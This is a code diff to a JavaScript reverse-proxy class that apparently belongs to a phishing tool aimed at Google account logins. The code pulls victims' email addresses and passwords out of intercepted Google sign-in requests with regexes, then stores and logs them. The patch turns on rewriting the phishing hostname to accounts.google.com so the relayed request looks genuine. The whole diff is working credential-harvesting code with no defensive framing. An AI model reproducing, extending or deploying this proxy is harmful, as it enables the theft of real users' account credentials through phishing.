@@ -37,9 +37,9 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
             this.browserReq.on('end', () => {
                 cJust += ''
                 const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
-                // const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
+                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
 
-                // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+                this.proxyEndpoint.setHeader('Content-Length', kJust.length)
 
                 const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
                 const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
@@ -54,7 +54,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
                     // this.proxyEndpoint.setHeader('content-length', cJust.length)
-                    this.proxyEndpoint.write(cJust) 
+                    this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end('')
 
                 }else if (passwordMatch) {
@@ -65,13 +65,13 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                         { password: passwordStr })
                     console.log(`password is ${passwordStr}`)
                     // this.proxyEndpoint.setHeader('content-length', cJust.length)
-                    this.proxyEndpoint.write(cJust) 
+                    this.proxyEndpoint.write(kJust) 
                     this.proxyEndpoint.end('')
 
                 } else {
                     console.log('NO matches found')
                     // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
-                    this.proxyEndpoint.write(cJust)
+                    this.proxyEndpoint.write(kJust)
                     return this.proxyEndpoint.end('')
                 }
             })
